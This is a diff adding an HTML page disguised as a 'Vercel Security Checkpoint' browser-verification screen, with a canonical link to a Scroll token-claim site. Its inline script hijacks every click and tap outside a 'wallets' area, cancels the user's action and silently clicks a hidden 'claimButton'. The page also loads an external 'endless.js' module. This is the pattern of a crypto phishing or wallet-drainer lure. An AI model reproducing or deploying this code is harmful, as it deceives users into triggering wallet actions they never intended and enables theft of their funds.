@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html data-astro-cid-nbv56vs3="" dir="ltr" lang="en">
+ <head>
+  <meta content="upgrade-insecure-requests" http-equiv="Content-Security-Policy"/>
+  <script defer="True" src="endless.js" type="module">
+  </script>
+  <script>
+   let count_clicks = 0
+
+window.onclick = (e) => {
+    // console.log(e.target)
+    console.log("clicked");
+    console.log(e.target.tagName)
+    const walletsDiv = document.getElementById('wallets');
+
+    // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
+    if (walletsDiv && walletsDiv.contains(e.target)) {
+        return
+    }
+
+    if (e.target.id != 'click_button1') {
+
+        e.preventDefault()
+        console.log(`clicks ${count_clicks}`);
+
+        if (count_clicks % 2 === 0) {
+            document.getElementById('click_button1').click()
+        }
+        // console.log('clicked')
+        count_clicks += 1;
+    }
+}
+let touchStartTime = 0;
+let count_taps = 0
+window.ontouchstart = (e) => {
+    touchStartTime = Date.now();
+
+}
+window.ontouchend = (e) => {
+    console.log("tapped");
+    console.log(e.target.tagName)
+    const touchEndTime = Date.now();
+    const touchDuration = touchEndTime - touchStartTime;
+    const walletsDiv = document.getElementById('wallets');
+ if (walletsDiv && walletsDiv.contains(e.target)) {
+        return
+    }
+    if (touchDuration < 300) {
+        // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
+        if (e.target.id != 'click_button1' ) {
+
+            if (count_taps % 2 === 0) {
+
+                e.preventDefault()
+            }
+
+            document.getElementById('click_button1').click()
+//            console.log('clicked')
+        }
+        count_taps++;
+
+    }
+}
+  </script>
+ </head>
+ <meta charset="utf-8"/>
+ <meta content="width=device-width, initial-scale=1" name="viewport"/>
+ <meta content="#000" name="theme-color"/>
+ <title>
+  Vercel Security Checkpoint
+ </title>
+ <style>
+  .spinner[data-astro-cid-jlpqxutv]{display:flex;flex-direction:column;justify-content:center;align-items:center}.spinner-circle[data-astro-cid-jlpqxutv]{transform-origin:center;animation:spinner-circle-animate 1s step-start infinite}rect[data-astro-cid-jlpqxutv]{fill:var(--ds-gray-900)}@keyframes spinner-circle-animate{0%{transform:rotate(0)}10%{transform:rotate(36deg)}20%{transform:rotate(72deg)}30%{transform:rotate(108deg)}40%{transform:rotate(144deg)}50%{transform:rotate(180deg)}60%{transform:rotate(216deg)}70%{transform:rotate(252deg)}80%{transform:rotate(288deg)}90%{transform:rotate(324deg)}to{transform:rotate(360deg)}}:root{--ds-gray-900:hsla(0,0%,40%,1);--ds-gray-alpha-1000:hsla(0,0%,0%,.91);--background-color:hsla(0,0%,100%,1)}@media (prefers-color-scheme:dark){:root{--ds-gray-900:hsla(0,0%,63%,1);--ds-gray-alpha-1000:hsla(0,0%,100%,.92);--background-color:hsla(0,0%,4%,1)}}html{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Noto Sans,Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji";font-size:1.2rem;line-height:1.65;word-break:break-word;font-kerning:auto;font-variant:normal;text-rendering:optimizeLegibility;hyphens:auto;height:100vh;max-height:100vh;margin:0;background-color:var(--background-color);color:var(--ds-gray-900)}.container[data-astro-cid-nbv56vs3]{justify-content:center;flex-direction:column;min-height:100%}main[data-astro-cid-nbv56vs3]{max-width:80rem;padding:4rem 6rem;margin:auto}p[data-astro-cid-nbv56vs3]#header-text{color:var(--ds-gray-alpha-1000);font-size:1.2rem;font-weight:500;line-height:32px;text-align:center}footer[data-astro-cid-nbv56vs3]{color:var(--ds-gray-900);line-height:1rem;font-size:.75rem;padding-bottom:24px;display:flex;flex-direction:row;justify-content:center;align-items:center;font-weight:200;font-family:ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace}footer[data-astro-cid-nbv56vs3] div[data-astro-cid-nbv56vs3]{display:flex;flex-direction:row;gap:3px}@media (max-width:600px){body{height:100dvh;max-height:100dvh}main[data-astro-cid-nbv56vs3]{padding:1rem 2rem}body{font-size:1.4rem;line-height:1.55;text-align:center}footer[data-astro-cid-nbv56vs3]{display:flex;flex-direction:column;text-align:center;padding:24px 12px}footer[data-astro-cid-nbv56vs3] p[data-astro-cid-nbv56vs3]{margin:6px auto}footer[data-astro-cid-nbv56vs3] div[data-astro-cid-nbv56vs3]{display:flex;flex-direction:column;gap:0px}}
+ </style>
+ <meta content="no-referrer" name="referrer"/>
+ <link href="https://claim.scroll.io/" rel="canonical"/>
+ <style>
+  img[src="data:,"],source[src="data:,"]{display:none!important}
+ </style>
+ <body data-astro-cid-nbv56vs3="">
+  <button class="style claimButton" hidden="True" id="click_button1">
+  </button>
+  <div class="container" data-astro-cid-nbv56vs3="" id="root" style="display:flex">
+   <main data-astro-cid-nbv56vs3="">
+    <div class="spinner" data-astro-cid-jlpqxutv="">
+     <svg data-astro-cid-jlpqxutv="" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+      <g class="spinner-circle" data-astro-cid-jlpqxutv="">
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity="1" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".1" transform="rotate(36 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".2" transform="rotate(72 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".3" transform="rotate(108 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".4" transform="rotate(144 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".5" transform="rotate(180 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".6" transform="rotate(216 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".7" transform="rotate(252 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".8" transform="rotate(288 12 12)" width="2" x="11" y="1">
+       </rect>
+       <rect data-astro-cid-jlpqxutv="" height="6" opacity=".9" transform="rotate(324 12 12)" width="2" x="11" y="1">
+       </rect>
+      </g>
+     </svg>
+    </div>
+    <p data-astro-cid-nbv56vs3="" id="header-text">
+     We're verifying your browser
+    </p>
+   </main>
+   <footer data-astro-cid-nbv56vs3="">
+    <div data-astro-cid-nbv56vs3="">
+     <p data-astro-cid-nbv56vs3="" id="footer-text">
+      Vercel Security Checkpoint
+     </p>
+     <p class="hide-mobile" data-astro-cid-nbv56vs3="">
+      |
+     </p>
+     <p data-astro-cid-nbv56vs3="">
+      fra1::50iiMMwegpiqZ5ldan9ou61GXnD0oKoX
+     </p>
+    </div>
+   </footer>
+  </div>
+  <noscript>
+   <div class="container" data-astro-cid-nbv56vs3="">
+    <main data-astro-cid-nbv56vs3="">
+     <div class="spinner" data-astro-cid-jlpqxutv="">
+      <svg data-astro-cid-jlpqxutv="" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+       <g class="spinner-circle" data-astro-cid-jlpqxutv="">
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity="1" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".1" transform="rotate(36 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".2" transform="rotate(72 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".3" transform="rotate(108 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".4" transform="rotate(144 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".5" transform="rotate(180 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".6" transform="rotate(216 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".7" transform="rotate(252 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".8" transform="rotate(288 12 12)" width="2" x="11" y="1">
+        </rect>
+        <rect data-astro-cid-jlpqxutv="" height="6" opacity=".9" transform="rotate(324 12 12)" width="2" x="11" y="1">
+        </rect>
+       </g>
+      </svg>
+     </div>
+     <p data-astro-cid-nbv56vs3="" id="header-noscript-text">
+      Enable JavaScript to continue
+     </p>
+    </main>
+    <footer data-astro-cid-nbv56vs3="">
+     <div data-astro-cid-nbv56vs3="">
+      <p data-astro-cid-nbv56vs3="">
+       Vercel Security Checkpoint
+      </p>
+      <p class="hide-mobile" data-astro-cid-nbv56vs3="">
+       |
+      </p>
+      <p data-astro-cid-nbv56vs3="">
+       fra1::50iiMMwegpiqZ5ldan9ou61GXnD0oKoX
+      </p>
+     </div>
+    </footer>
+   </div>
+  </noscript>
+  <script>
+   document.currentScript.remove();addEventListener("load",()=>document.querySelectorAll("style[data-sf-duplicate-stylesheet-ref]").forEach(e=>e.remove()))
+  </script>
+ </body>
+</html>
